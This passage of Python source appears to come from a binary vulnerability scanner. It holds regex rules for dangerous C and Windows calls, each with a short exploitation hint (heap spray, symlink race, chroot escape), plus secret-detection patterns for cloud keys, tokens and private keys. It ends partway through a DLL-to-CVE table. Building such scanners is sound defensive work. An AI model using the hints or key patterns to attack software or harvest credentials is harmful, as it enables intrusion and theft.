            "pattern": re.compile(r'\bcalloc\s*\([^,]+,\s*[^)]*\*', re.I),
            "title": "Integer Overflow in calloc",
            "severity": "high",
            "cwe": "CWE-190",
            "description": "Multiplication in calloc parameters can overflow",
            "exploitation": "Same as malloc overflow exploitation",
            "remediation": "Validate sizes before calloc call"
        },
        {
            "pattern": re.compile(r'\brealloc\s*\([^,]+,\s*[^)]*\*', re.I),
            "title": "Integer Overflow in realloc",
            "severity": "high",
            "cwe": "CWE-190",
            "description": "Size calculation in realloc can overflow",
            "exploitation": "Shrink allocation then overflow",
            "remediation": "Validate size before realloc"
        },
        {
            "pattern": re.compile(r'\bVirtualAlloc\s*\([^)]*\*', re.I),
            "title": "Integer Overflow in VirtualAlloc",
            "severity": "high",
            "cwe": "CWE-190",
            "description": "Windows VirtualAlloc size calculation overflow",
            "exploitation": "Allocate small region, overflow bounds",
            "remediation": "Use safe integer arithmetic"
        },
        {
            "pattern": re.compile(r'\bHeapAlloc\s*\([^)]*\*', re.I),
            "title": "Integer Overflow in HeapAlloc",
            "severity": "high",
            "cwe": "CWE-190",
            "description": "Windows HeapAlloc size calculation overflow",
            "exploitation": "Same as VirtualAlloc exploitation",
            "remediation": "Validate size calculations"
        },
        {
            "pattern": re.compile(r'<<\s*[a-zA-Z_][a-zA-Z0-9_]*', re.I),
            "title": "Bit Shift with Variable",
            "severity": "medium",
            "cwe": "CWE-190",
            "description": "Left shift by variable can cause overflow",
            "exploitation": "Large shift amount causes unexpected results",
            "remediation": "Validate shift amount is within bounds"
        },
        {
            "pattern": re.compile(r'\(unsigned\s*(int|long|short)\)\s*-', re.I),
            "title": "Unsigned Integer Underflow",
            "severity": "high",
            "cwe": "CWE-191",
            "description": "Subtraction on unsigned can wrap to large value",
            "exploitation": "Cause wrap-around to bypass size checks",
            "remediation": "Check for underflow before subtraction"
        },
    ],

    # ========================================================================
    # USE AFTER FREE PATTERNS (CWE-416)
    # ========================================================================
    "use_after_free": [
        {
            "pattern": re.compile(r'\bfree\s*\([^)]+\)\s*;[^=}]*->', re.I | re.S),
            "title": "Potential Use After Free",
            "severity": "critical",
            "cwe": "CWE-416",
            "description": "Pointer dereference after free() call",
            "exploitation": "Heap spray to control freed memory, trigger use",
            "remediation": "Set pointer to NULL after free, check before use"
        },
        {
            "pattern": re.compile(r'\bdelete\s+[a-zA-Z_][a-zA-Z0-9_]*\s*;[^=}]*->', re.I | re.S),
            "title": "C++ Use After Delete",
            "severity": "critical",
            "cwe": "CWE-416",
            "description": "Object access after delete",
            "exploitation": "Same as use-after-free",
            "remediation": "Use smart pointers, set to nullptr after delete"
        },
        {
            "pattern": re.compile(r'\bHeapFree\s*\([^)]+\)\s*;[^=}]*->', re.I | re.S),
            "title": "Use After HeapFree",
            "severity": "critical",
            "cwe": "CWE-416",
            "description": "Windows heap use after free",
            "exploitation": "Same exploitation as standard use-after-free",
            "remediation": "Zero pointer after HeapFree"
        },
        {
            "pattern": re.compile(r'\bLocalFree\s*\(|GlobalFree\s*\(', re.I),
            "title": "Windows Memory Free",
            "severity": "medium",
            "cwe": "CWE-416",
            "description": "Windows memory deallocation - check for use-after-free",
            "exploitation": "Same as HeapFree exploitation",
            "remediation": "Set handle to NULL after free"
        },
        {
            "pattern": re.compile(r'\bVirtualFree\s*\(', re.I),
            "title": "VirtualFree Usage",
            "severity": "medium",
            "cwe": "CWE-416",
            "description": "Virtual memory deallocation - potential UAF",
            "exploitation": "Access freed virtual memory region",
            "remediation": "Clear all pointers to freed region"
        },
    ],

    # ========================================================================
    # PATH TRAVERSAL PATTERNS (CWE-22)
    # ========================================================================
    "path_traversal": [
        {
            "pattern": re.compile(r'\bfopen\s*\([^"\']+,', re.I),
            "title": "fopen with Variable Path",
            "severity": "high",
            "cwe": "CWE-22",
            "description": "fopen with variable path may allow traversal",
            "exploitation": "Use ../ sequences to access arbitrary files",
            "remediation": "Validate path, use realpath(), check canonical path"
        },
        {
            "pattern": re.compile(r'\bopen\s*\([^"\']+,', re.I),
            "title": "open() with Variable Path",
            "severity": "high",
            "cwe": "CWE-22",
            "description": "POSIX open with variable path",
            "exploitation": "Path traversal via ../ or symlink following",
            "remediation": "Validate path, use O_NOFOLLOW flag"
        },
        {
            "pattern": re.compile(r'\bCreateFile[AW]?\s*\([^"\']+,', re.I),
            "title": "Windows CreateFile with Variable Path",
            "severity": "high",
            "cwe": "CWE-22",
            "description": "Windows file open with variable path",
            "exploitation": "Use ..\\, device names (CON, NUL, etc)",
            "remediation": "Canonicalize path, validate against whitelist"
        },
        {
            "pattern": re.compile(r'\.\./', re.I),
            "title": "Directory Traversal Sequence",
            "severity": "medium",
            "cwe": "CWE-22",
            "description": "Hardcoded path traversal sequence detected",
            "exploitation": "Navigate outside intended directory",
            "remediation": "Remove or validate traversal sequences"
        },
        {
            "pattern": re.compile(r'\.\.\\\\', re.I),
            "title": "Windows Directory Traversal",
            "severity": "medium",
            "cwe": "CWE-22",
            "description": "Windows-style path traversal sequence",
            "exploitation": "Navigate outside intended directory on Windows",
            "remediation": "Remove or validate traversal sequences"
        },
        {
            "pattern": re.compile(r'\bDeleteFile[AW]?\s*\(|RemoveDirectory[AW]?\s*\(', re.I),
            "title": "File/Directory Deletion",
            "severity": "medium",
            "cwe": "CWE-22",
            "description": "File deletion with potential path traversal",
            "exploitation": "Delete arbitrary files via path manipulation",
            "remediation": "Validate paths before deletion"
        },
        {
            "pattern": re.compile(r'\bunlink\s*\(|remove\s*\(', re.I),
            "title": "POSIX File Deletion",
            "severity": "medium",
            "cwe": "CWE-22",
            "description": "File removal with potential path traversal",
            "exploitation": "Delete arbitrary files via ../ in path",
            "remediation": "Validate and canonicalize paths"
        },
    ],

    # ========================================================================
    # RACE CONDITION PATTERNS (CWE-362, CWE-367)
    # ========================================================================
    "race_condition": [
        {
            "pattern": re.compile(r'\baccess\s*\([^)]+\)[^{]*\bopen\s*\(', re.I | re.S),
            "title": "TOCTOU Race (access/open)",
            "severity": "high",
            "cwe": "CWE-367",
            "description": "Time-of-check to time-of-use vulnerability",
            "exploitation": "Replace file between access() and open() calls",
            "remediation": "Use O_NOFOLLOW, fstat after open instead of access"
        },
        {
            "pattern": re.compile(r'\bstat\s*\([^)]+\)[^{]*\bopen\s*\(', re.I | re.S),
            "title": "TOCTOU Race (stat/open)",
            "severity": "high",
            "cwe": "CWE-367",
            "description": "File properties checked with stat, then opened",
            "exploitation": "Symlink attack between stat and open",
            "remediation": "Use fstat on opened file descriptor"
        },
        {
            "pattern": re.compile(r'\blstat\s*\([^)]+\)[^{]*\b(open|fopen)\s*\(', re.I | re.S),
            "title": "TOCTOU Race (lstat/open)",
            "severity": "medium",
            "cwe": "CWE-367",
            "description": "lstat check followed by file open",
            "exploitation": "Race window for file replacement",
            "remediation": "Open first, then fstat the descriptor"
        },
    ],

    # ========================================================================
    # WEAK CRYPTOGRAPHY PATTERNS (CWE-327, CWE-328)
    # ========================================================================
    "weak_crypto": [
        {
            "pattern": re.compile(r'\bDES_\w+\s*\(', re.I),
            "title": "DES Encryption (Broken)",
            "severity": "high",
            "cwe": "CWE-327",
            "description": "DES is cryptographically broken (56-bit key)",
            "exploitation": "Brute force attack is feasible",
            "remediation": "Use AES-256-GCM or ChaCha20-Poly1305"
        },
        {
            "pattern": re.compile(r'\bRC4\s*\(|rc4_\w+\s*\(', re.I),
            "title": "RC4 Stream Cipher (Broken)",
            "severity": "high",
            "cwe": "CWE-327",
            "description": "RC4 has known biases and attacks",
            "exploitation": "Statistical attacks can recover plaintext",
            "remediation": "Use AES-GCM or ChaCha20"
        },
        {
            "pattern": re.compile(r'\bMD5_?\w*\s*\(|MD5Init|MD5Update|MD5Final', re.I),
            "title": "MD5 Hash (Collision-Vulnerable)",
            "severity": "medium",
            "cwe": "CWE-328",
            "description": "MD5 is vulnerable to collision attacks",
            "exploitation": "Create colliding inputs for signature bypass",
            "remediation": "Use SHA-256 or SHA-3"
        },
        {
            "pattern": re.compile(r'\bSHA1\s*\(|SHA1Init|SHA1Update|SHA1Final', re.I),
            "title": "SHA-1 Hash (Deprecated)",
            "severity": "medium",
            "cwe": "CWE-328",
            "description": "SHA-1 has practical collision attacks",
            "exploitation": "Collision attacks demonstrated (SHAttered)",
            "remediation": "Use SHA-256 or SHA-3"
        },
        {
            "pattern": re.compile(r'\brand\s*\(\s*\)|srand\s*\(', re.I),
            "title": "Insecure Random (rand/srand)",
            "severity": "high",
            "cwe": "CWE-330",
            "description": "rand() is predictable, not cryptographically secure",
            "exploitation": "Predict random values to bypass security",
            "remediation": "Use /dev/urandom, CryptGenRandom, or getrandom()"
        },
        {
            "pattern": re.compile(r'\bCryptGenRandom\s*\(', re.I),
            "title": "Windows CryptGenRandom",
            "severity": "info",
            "cwe": "N/A",
            "description": "Windows CSPRNG - good if used correctly",
            "exploitation": "N/A - proper usage",
            "remediation": "Ensure proper error handling"
        },
        {
            "pattern": re.compile(r'\bBCryptGenRandom\s*\(', re.I),
            "title": "Windows BCryptGenRandom",
            "severity": "info",
            "cwe": "N/A",
            "description": "Modern Windows CSPRNG - recommended",
            "exploitation": "N/A - proper usage",
            "remediation": "Good choice - ensure error handling"
        },
        {
            "pattern": re.compile(r'key\s*=\s*["\'][A-Za-z0-9+/=]{8,}["\']', re.I),
            "title": "Hardcoded Cryptographic Key",
            "severity": "critical",
            "cwe": "CWE-321",
            "description": "Cryptographic key embedded in code",
            "exploitation": "Extract key from binary to decrypt data",
            "remediation": "Use key derivation, secure key storage"
        },
        {
            "pattern": re.compile(r'(password|passwd|pwd)\s*=\s*["\'][^"\']+["\']', re.I),
            "title": "Hardcoded Password",
            "severity": "critical",
            "cwe": "CWE-798",
            "description": "Password embedded in code",
            "exploitation": "Extract password from binary",
            "remediation": "Use secure credential storage"
        },
    ],

    # ========================================================================
    # NULL POINTER / MEMORY PATTERNS (CWE-476)
    # ========================================================================
    "null_pointer": [
        {
            "pattern": re.compile(r'\bmalloc\s*\([^)]+\)\s*;\s*[a-zA-Z_]\w*\s*->', re.I | re.S),
            "title": "Unchecked malloc Return",
            "severity": "high",
            "cwe": "CWE-476",
            "description": "malloc return not checked before dereference",
            "exploitation": "Cause allocation failure, trigger null deref",
            "remediation": "Always check malloc return != NULL"
        },
        {
            "pattern": re.compile(r'\bcalloc\s*\([^)]+\)\s*;\s*[a-zA-Z_]\w*\s*->', re.I | re.S),
            "title": "Unchecked calloc Return",
            "severity": "high",
            "cwe": "CWE-476",
            "description": "calloc return not checked before use",
            "exploitation": "Same as unchecked malloc",
            "remediation": "Check calloc return != NULL"
        },
        {
            "pattern": re.compile(r'\brealloc\s*\([^)]+\)\s*;\s*[a-zA-Z_]\w*\s*->', re.I | re.S),
            "title": "Unchecked realloc Return",
            "severity": "high",
            "cwe": "CWE-476",
            "description": "realloc can return NULL on failure",
            "exploitation": "Cause OOM, trigger null pointer access",
            "remediation": "Check realloc return, preserve original pointer"
        },
    ],

    # ========================================================================
    # DANGEROUS FUNCTION PATTERNS (General)
    # ========================================================================
    "dangerous_functions": [
        {
            "pattern": re.compile(r'\balloca\s*\(', re.I),
            "title": "Stack Allocation (alloca)",
            "severity": "medium",
            "cwe": "CWE-770",
            "description": "alloca allocates on stack - can cause stack overflow",
            "exploitation": "Large allocation exhausts stack space",
            "remediation": "Use heap allocation with size limits"
        },
        {
            "pattern": re.compile(r'\b_alloca\s*\(', re.I),
            "title": "Windows _alloca",
            "severity": "medium",
            "cwe": "CWE-770",
            "description": "Windows stack allocation function",
            "exploitation": "Stack overflow via large allocation",
            "remediation": "Use _malloca with _freea, or heap allocation"
        },
        {
            "pattern": re.compile(r'\bsetjmp\s*\(|longjmp\s*\(', re.I),
            "title": "setjmp/longjmp Usage",
            "severity": "medium",
            "cwe": "CWE-628",
            "description": "Non-local jumps can bypass cleanup code",
            "exploitation": "Corrupt state by jumping over destructors/cleanup",
            "remediation": "Avoid setjmp/longjmp, use structured error handling"
        },
        {
            "pattern": re.compile(r'\batexit\s*\([^"\']+\)', re.I),
            "title": "atexit with Variable",
            "severity": "medium",
            "cwe": "CWE-676",
            "description": "Exit handler registration with variable function",
            "exploitation": "Register malicious cleanup handler",
            "remediation": "Only use atexit with constant function pointers"
        },
        {
            "pattern": re.compile(r'\bassert\s*\(\s*0\s*\)|assert\s*\(\s*false\s*\)', re.I),
            "title": "Unreachable Code Assert",
            "severity": "low",
            "cwe": "CWE-617",
            "description": "Assertion that always fails",
            "exploitation": "May crash in debug builds",
            "remediation": "Use proper error handling instead"
        },
    ],

    # ========================================================================
    # INFORMATION DISCLOSURE PATTERNS (CWE-200)
    # ========================================================================
    "info_disclosure": [
        {
            "pattern": re.compile(r'\bgetenv\s*\(\s*["\']PATH|getenv\s*\(\s*["\']HOME|getenv\s*\(\s*["\']USER', re.I),
            "title": "Environment Variable Access",
            "severity": "low",
            "cwe": "CWE-200",
            "description": "Reading environment variables",
            "exploitation": "May leak system information",
            "remediation": "Validate environment values before use"
        },
        {
            "pattern": re.compile(r'\bGetEnvironmentVariable[AW]?\s*\(', re.I),
            "title": "Windows Environment Variable Access",
            "severity": "low",
            "cwe": "CWE-200",
            "description": "Reading Windows environment variables",
            "exploitation": "Environment can be attacker-controlled",
            "remediation": "Validate environment values"
        },
        {
            "pattern": re.compile(r'\bperror\s*\(|\bstrerror\s*\(', re.I),
            "title": "Error Message Exposure",
            "severity": "low",
            "cwe": "CWE-209",
            "description": "System error messages may leak information",
            "exploitation": "Use errors to probe system configuration",
            "remediation": "Log errors internally, show generic messages to users"
        },
    ],

    # ========================================================================
    # NETWORK / SOCKET PATTERNS (CWE-319)
    # ========================================================================
    "network_security": [
        {
            "pattern": re.compile(r'\bsocket\s*\([^)]*SOCK_RAW', re.I),
            "title": "Raw Socket Usage",
            "severity": "medium",
            "cwe": "CWE-250",
            "description": "Raw sockets require elevated privileges",
            "exploitation": "Packet injection, sniffing if exploited",
            "remediation": "Verify raw socket is necessary"
        },
        {
            "pattern": re.compile(r'\brecv\s*\([^,]+,\s*[^,]+,\s*[a-zA-Z_][a-zA-Z0-9_]*\s*,', re.I),
            "title": "recv with Variable Size",
            "severity": "medium",
            "cwe": "CWE-120",
            "description": "Network recv with variable buffer size",
            "exploitation": "Send more data than buffer can hold",
            "remediation": "Validate size against buffer capacity"
        },
        {
            "pattern": re.compile(r'\brecvfrom\s*\(', re.I),
            "title": "UDP recvfrom",
            "severity": "low",
            "cwe": "CWE-120",
            "description": "UDP receive - verify buffer size handling",
            "exploitation": "Oversized UDP packet overflow",
            "remediation": "Validate buffer size parameter"
        },
        {
            "pattern": re.compile(r'INADDR_ANY|0\.0\.0\.0', re.I),
            "title": "Binding to All Interfaces",
            "severity": "low",
            "cwe": "CWE-200",
            "description": "Service binds to all network interfaces",
            "exploitation": "Service accessible from all networks",
            "remediation": "Bind to specific interface if possible"
        },
    ],

    # ========================================================================
    # PRIVILEGE PATTERNS (CWE-250, CWE-269)
    # ========================================================================
    "privilege_issues": [
        {
            "pattern": re.compile(r'\bsetuid\s*\(\s*0\s*\)|seteuid\s*\(\s*0\s*\)', re.I),
            "title": "Elevation to Root",
            "severity": "high",
            "cwe": "CWE-250",
            "description": "Code attempts to gain root privileges",
            "exploitation": "If this can be triggered, full system access",
            "remediation": "Drop privileges as soon as possible"
        },
        {
            "pattern": re.compile(r'\bchroot\s*\(', re.I),
            "title": "chroot Usage",
            "severity": "medium",
            "cwe": "CWE-250",
            "description": "chroot is not a security boundary by itself",
            "exploitation": "Escape chroot via file descriptors, proc, etc",
            "remediation": "Use proper containerization, drop privileges after chroot"
        },
        {
            "pattern": re.compile(r'\bAdjustTokenPrivileges\s*\(', re.I),
            "title": "Windows Privilege Adjustment",
            "severity": "high",
            "cwe": "CWE-250",
            "description": "Windows token privilege modification",
            "exploitation": "May enable dangerous privileges",
            "remediation": "Only enable minimum required privileges"
        },
        {
            "pattern": re.compile(r'\bImpersonateLoggedOnUser\s*\(|ImpersonateNamedPipeClient\s*\(', re.I),
            "title": "Windows Impersonation",
            "severity": "high",
            "cwe": "CWE-269",
            "description": "Windows user impersonation",
            "exploitation": "Privilege escalation via impersonation",
            "remediation": "Carefully validate impersonation context"
        },
    ],
}


def scan_decompiled_binary_comprehensive(ghidra_result: Dict[str, Any], is_legitimate_software: bool = False) -> Dict[str, Any]:
    """
    Comprehensive vulnerability scanner for Ghidra decompiled binary code.
    Mirrors the APK scan_decompiled_source_comprehensive() functionality.
    
    IMPORTANT: This scanner uses pattern matching which can produce false positives.
    Many "unsafe" functions like strcpy/sprintf are used safely by legitimate software
    with proper bounds checking at call sites. The findings should be verified by AI
    or manual review.
    
    Args:
        ghidra_result: Dictionary containing Ghidra decompilation output
        is_legitimate_software: If True, apply stricter filtering to reduce false positives
    
    Returns:
        Dictionary with findings, summary, and scan statistics
    """
    import time
    start_time = time.time()
    
    findings: List[Dict[str, Any]] = []
    
    if not ghidra_result or "error" in ghidra_result:
        return {
            "findings": [],
            "summary": {"error": ghidra_result.get("error", "No Ghidra result")},
            "scan_stats": {"functions_scanned": 0, "scan_time": 0}
        }
    
    functions = ghidra_result.get("functions", [])
    if not functions:
        return {
            "findings": [],
            "summary": {"error": "No functions in Ghidra output"},
            "scan_stats": {"functions_scanned": 0, "scan_time": 0}
        }
    
    program_info = ghidra_result.get("program", {})
    logger.info(f"Scanning {len(functions)} decompiled functions for vulnerabilities")
    
    # Count patterns for logging
    total_patterns = sum(len(patterns) for patterns in BINARY_VULN_PATTERNS.values())
    logger.info(f"Using {total_patterns} vulnerability patterns across {len(BINARY_VULN_PATTERNS)} categories")
    
    # Context patterns that indicate SAFE usage (reduces false positives)
    SAFE_USAGE_INDICATORS = {
        # strcpy/strcat with prior length check
        r'strlen\s*\([^)]*\)\s*[<>]',  # Length comparison before copy
        r'sizeof\s*\([^)]*\)',  # Using sizeof
        r'_countof\s*\([^)]*\)',  # MSVC array count
        r'ARRAYSIZE\s*\([^)]*\)',  # Windows array size macro
        r'min\s*\(|MIN\s*\(',  # Using min to bound
        r'__builtin_object_size',  # GCC bounds checking
        r'_FORTIFY_SOURCE',  # Fortified functions
    }
    
    # Compile safe usage patterns
    safe_patterns = [re.compile(p, re.I) for p in SAFE_USAGE_INDICATORS]
    
    functions_with_findings = set()
    filtered_count = 0  # Track how many we filtered out
    
    for func in functions:
        func_name = func.get("name", "unknown")
        entry_addr = func.get("entry", "0x0")
        decompiled = func.get("decompiled", "")
        called_functions = func.get("called_functions", [])
        
        if not decompiled or len(decompiled) < 20:
            continue
        
        lines = decompiled.split('\n')
        
        # Check if this function has safety indicators
        func_has_safety_checks = any(sp.search(decompiled) for sp in safe_patterns)
        
        # Scan each vulnerability category
        for category, patterns in BINARY_VULN_PATTERNS.items():
            for pattern_info in patterns:
                pattern = pattern_info["pattern"]
                severity = pattern_info.get("severity", "medium")
                
                # For legitimate software, skip low/info severity patterns
                if is_legitimate_software and severity in ("low", "info"):
                    continue
                
                for match in pattern.finditer(decompiled):
                    # Calculate line number
                    line_num = decompiled[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    
                    # Get context (5 lines before and after)
                    start_ctx = max(0, line_idx - 5)
                    end_ctx = min(len(lines), line_idx + 6)
                    context_window = "\\n".join(lines[start_ctx:end_ctx])
                    current_line = lines[line_idx] if line_idx < len(lines) else ""
                    
                    # CONTEXT-AWARE FILTERING: Check if this usage appears safe
                    appears_safe = False
                    safety_reason = None
                    
                    # Check for bounds checking near this call
                    if any(sp.search(context_window) for sp in safe_patterns):
                        appears_safe = True
                        safety_reason = "Has bounds checking in context"
                    
                    # Check if it's a known-safe wrapper function name
                    safe_func_names = ["_s", "_safe", "checked", "bounded", "secure"]
                    if any(sf in func_name.lower() for sf in safe_func_names):
                        appears_safe = True
                        safety_reason = "Inside safety wrapper function"
                    
                    # For legitimate software + safety indicators, skip medium severity
                    if is_legitimate_software and appears_safe and severity == "medium":
                        filtered_count += 1
                        continue
                    
                    # Adjust severity if safety checks present but still reporting
                    adjusted_severity = severity
                    if appears_safe:
                        # Downgrade severity when safety patterns detected
                        severity_downgrade = {"critical": "high", "high": "medium", "medium": "low"}
                        adjusted_severity = severity_downgrade.get(severity, severity)
                    
                    finding = {
                        "category": category,
                        "severity": adjusted_severity,
                        "original_severity": severity,  # Keep original for reference
                        "title": pattern_info.get("title", "Unknown"),
                        "cwe_id": pattern_info.get("cwe", "N/A"),
                        "description": pattern_info.get("description", ""),
                        "function_name": func_name,
                        "entry_address": entry_addr,
                        "line_number": line_num,
                        "code_snippet": current_line.strip()[:300],
                        "context_before": "\n".join(lines[max(0, line_idx-2):line_idx]),
                        "context_after": "\n".join(lines[line_idx+1:min(len(lines), line_idx+3)]),
                        "matched_text": match.group()[:100],
                        "exploitation": pattern_info.get("exploitation", ""),
                        "remediation": pattern_info.get("remediation", ""),
                        "called_functions": called_functions[:10],
                        # NEW: Safety context
                        "has_safety_checks": appears_safe,
                        "safety_reason": safety_reason,
                        "confidence": "low" if appears_safe else ("high" if severity in ("critical", "high") else "medium"),
                    }
                    
                    findings.append(finding)
                    functions_with_findings.add(func_name)
    
    elapsed = time.time() - start_time
    
    # Build summary
    summary = {
        "total_findings": len(findings),
        "filtered_as_safe": filtered_count,
        "by_severity": {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
        "by_category": {},
        "functions_scanned": len(functions),
        "functions_with_findings": len(functions_with_findings),
        "program_info": program_info,
        "is_legitimate_software": is_legitimate_software,
    }
    
    for f in findings:
        sev = f.get("severity", "medium")
        cat = f.get("category", "unknown")
        if sev in summary["by_severity"]:
            summary["by_severity"][sev] += 1
        summary["by_category"][cat] = summary["by_category"].get(cat, 0) + 1
    
    logger.info(f"Binary code scan complete: {len(findings)} findings ({filtered_count} filtered as safe) in {elapsed:.1f}s")
    logger.info(f"  Critical: {summary['by_severity']['critical']}, High: {summary['by_severity']['high']}, "
                f"Medium: {summary['by_severity']['medium']}, Low: {summary['by_severity']['low']}")
    
    return {
        "findings": findings,
        "summary": summary,
        "scan_stats": {
            "functions_scanned": len(functions),
            "functions_with_findings": len(functions_with_findings),
            "total_findings": len(findings),
            "filtered_as_safe": filtered_count,
            "patterns_used": total_patterns,
            "scan_time": elapsed
        }
    }


def scan_binary_strings_for_secrets(strings: List[Dict[str, Any]]) -> Dict[str, Any]:
    """
    Scan extracted binary strings for hardcoded secrets, credentials, and sensitive data.
    Similar to APK secret scanning but adapted for binary string extraction.
    
    Args:
        strings: List of extracted strings with 'value', 'offset', 'encoding', 'category' keys
    
    Returns:
        Dictionary with findings categorized by type
    """
    import time
    start_time = time.time()
    
    findings: List[Dict[str, Any]] = []
    
    # Secret patterns for binary strings
    secret_patterns = [
        # API Keys
        {"pattern": re.compile(r'AIza[0-9A-Za-z_-]{35}'), "type": "google_api_key", "severity": "high"},
        {"pattern": re.compile(r'AKIA[0-9A-Z]{16}'), "type": "aws_access_key", "severity": "critical"},
        {"pattern": re.compile(r'[0-9a-zA-Z/+]{40}'), "type": "aws_secret_key_candidate", "severity": "high"},
        {"pattern": re.compile(r'sk_live_[0-9a-zA-Z]{24}'), "type": "stripe_secret_key", "severity": "critical"},
        {"pattern": re.compile(r'pk_live_[0-9a-zA-Z]{24}'), "type": "stripe_publishable_key", "severity": "medium"},
        {"pattern": re.compile(r'ghp_[0-9a-zA-Z]{36}'), "type": "github_pat", "severity": "critical"},
        {"pattern": re.compile(r'gho_[0-9a-zA-Z]{36}'), "type": "github_oauth", "severity": "critical"},
        {"pattern": re.compile(r'glpat-[0-9a-zA-Z_-]{20}'), "type": "gitlab_pat", "severity": "critical"},
        
        # Private Keys
        {"pattern": re.compile(r'-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----'), "type": "private_key", "severity": "critical"},
        {"pattern": re.compile(r'-----BEGIN\s+(?:EC\s+)?PRIVATE\s+KEY-----'), "type": "ec_private_key", "severity": "critical"},
        {"pattern": re.compile(r'-----BEGIN\s+OPENSSH\s+PRIVATE\s+KEY-----'), "type": "openssh_key", "severity": "critical"},
        
        # Database Connection Strings
        {"pattern": re.compile(r'mongodb(?:\+srv)?://[^\s"\']+'), "type": "mongodb_uri", "severity": "high"},
        {"pattern": re.compile(r'postgres(?:ql)?://[^\s"\']+'), "type": "postgres_uri", "severity": "high"},
        {"pattern": re.compile(r'mysql://[^\s"\']+'), "type": "mysql_uri", "severity": "high"},
        {"pattern": re.compile(r'Server=.*;Database=.*;User\s*Id=.*;Password=.*', re.I), "type": "mssql_connstring", "severity": "high"},
        
        # Generic Credentials
        {"pattern": re.compile(r'password\s*[:=]\s*["\'][^"\']{4,}["\']', re.I), "type": "hardcoded_password", "severity": "critical"},
        {"pattern": re.compile(r'passwd\s*[:=]\s*["\'][^"\']{4,}["\']', re.I), "type": "hardcoded_password", "severity": "critical"},
        {"pattern": re.compile(r'secret\s*[:=]\s*["\'][^"\']{8,}["\']', re.I), "type": "hardcoded_secret", "severity": "high"},
        {"pattern": re.compile(r'api[_-]?key\s*[:=]\s*["\'][A-Za-z0-9_-]{16,}["\']', re.I), "type": "api_key", "severity": "high"},
        {"pattern": re.compile(r'auth[_-]?token\s*[:=]\s*["\'][A-Za-z0-9_-]{16,}["\']', re.I), "type": "auth_token", "severity": "high"},
        
        # URLs with credentials
        {"pattern": re.compile(r'https?://[^:]+:[^@]+@[^\s"\']+'), "type": "url_with_credentials", "severity": "high"},
        
        # JWT Tokens
        {"pattern": re.compile(r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'), "type": "jwt_token", "severity": "high"},
    ]
    
    for string_entry in strings:
        value = string_entry.get("value", "")
        if len(value) < 8:
            continue
            
        for pattern_info in secret_patterns:
            if pattern_info["pattern"].search(value):
                findings.append({
                    "type": pattern_info["type"],
                    "severity": pattern_info["severity"],
                    "value": value[:100],
                    "masked_value": _mask_sensitive_value(value[:100]),
                    "offset": string_entry.get("offset"),
                    "encoding": string_entry.get("encoding"),
                    "original_category": string_entry.get("category"),
                })
                break  # One match per string
    
    elapsed = time.time() - start_time
    
    # Build summary
    summary = {
        "total": len(findings),
        "by_type": {},
        "by_severity": {"critical": 0, "high": 0, "medium": 0, "low": 0},
    }
    
    for f in findings:
        t = f.get("type", "unknown")
        sev = f.get("severity", "medium")
        summary["by_type"][t] = summary["by_type"].get(t, 0) + 1
        if sev in summary["by_severity"]:
            summary["by_severity"][sev] += 1
    
    return {
        "findings": findings,
        "summary": summary,
        "scan_stats": {
            "strings_scanned": len(strings),
            "secrets_found": len(findings),
            "scan_time": elapsed
        }
    }


# ============================================================================
# Part 2: Binary CVE Lookup (PE/ELF Library Detection + OSV.dev/NVD)
# ============================================================================

# Known Windows DLL to library/version mappings for CVE lookup
KNOWN_WINDOWS_DLLS = {
    # Visual C++ Runtime
    "vcruntime140.dll": ("microsoft:visual_c++_runtime", "14.0", "Windows"),
    "vcruntime140d.dll": ("microsoft:visual_c++_runtime_debug", "14.0", "Windows"),
    "msvcp140.dll": ("microsoft:visual_c++_runtime", "14.0", "Windows"),
    "msvcp140d.dll": ("microsoft:visual_c++_runtime_debug", "14.0", "Windows"),
    "vcruntime140_1.dll": ("microsoft:visual_c++_runtime", "14.1", "Windows"),
    "msvcp140_1.dll": ("microsoft:visual_c++_runtime", "14.1", "Windows"),
    "msvcrt.dll": ("microsoft:c_runtime", "6.0", "Windows"),
    "msvcr100.dll": ("microsoft:visual_c++_runtime", "10.0", "Windows"),
    "msvcr110.dll": ("microsoft:visual_c++_runtime", "11.0", "Windows"),
    "msvcr120.dll": ("microsoft:visual_c++_runtime", "12.0", "Windows"),
    
    # OpenSSL
    "libssl-1_1.dll": ("openssl:openssl", "1.1", "OpenSSL"),
    "libssl-1_1-x64.dll": ("openssl:openssl", "1.1", "OpenSSL"),
    "libssl-3.dll": ("openssl:openssl", "3.0", "OpenSSL"),
    "libssl-3-x64.dll": ("openssl:openssl", "3.0", "OpenSSL"),
    "libcrypto-1_1.dll": ("openssl:openssl", "1.1", "OpenSSL"),
    "libcrypto-1_1-x64.dll": ("openssl:openssl", "1.1", "OpenSSL"),
    "libcrypto-3.dll": ("openssl:openssl", "3.0", "OpenSSL"),
    "libcrypto-3-x64.dll": ("openssl:openssl", "3.0", "OpenSSL"),
    "ssleay32.dll": ("openssl:openssl", "0.9", "OpenSSL"),
    "libeay32.dll": ("openssl:openssl", "0.9", "OpenSSL"),
    
    # SQLite
    "sqlite3.dll": ("sqlite:sqlite", "3", "sqlite"),
    "sqlite.dll": ("sqlite:sqlite", "2", "sqlite"),
    
    # libcurl
    "libcurl.dll": ("haxx:libcurl", None, "curl"),
    "libcurl-4.dll": ("haxx:libcurl", "4", "curl"),
    "curl.dll": ("haxx:libcurl", None, "curl"),
    
    # zlib
    "zlib.dll": ("zlib:zlib", None, "zlib"),
    "zlib1.dll": ("zlib:zlib", "1", "zlib"),
    "zlibwapi.dll": ("zlib:zlib", None, "zlib"),
    
    # libxml2
    "libxml2.dll": ("xmlsoft:libxml2", None, "libxml2"),
    "xml2.dll": ("xmlsoft:libxml2", None, "libxml2"),
    
    # Expat
    "libexpat.dll": ("libexpat:expat", None, "expat"),
    "expat.dll": ("libexpat:expat", None, "expat"),
    
    # libpng
    "libpng16.dll": ("libpng:libpng", "1.6", "libpng"),
    "libpng15.dll": ("libpng:libpng", "1.5", "libpng"),
    "libpng14.dll": ("libpng:libpng", "1.4", "libpng"),
    "png.dll": ("libpng:libpng", None, "libpng"),
    
    # libjpeg
    "libjpeg.dll": ("ijg:libjpeg", None, "libjpeg"),
    "jpeg62.dll": ("ijg:libjpeg", "6.2", "libjpeg"),
    "libjpeg-turbo.dll": ("libjpeg-turbo:libjpeg-turbo", None, "libjpeg-turbo"),
    
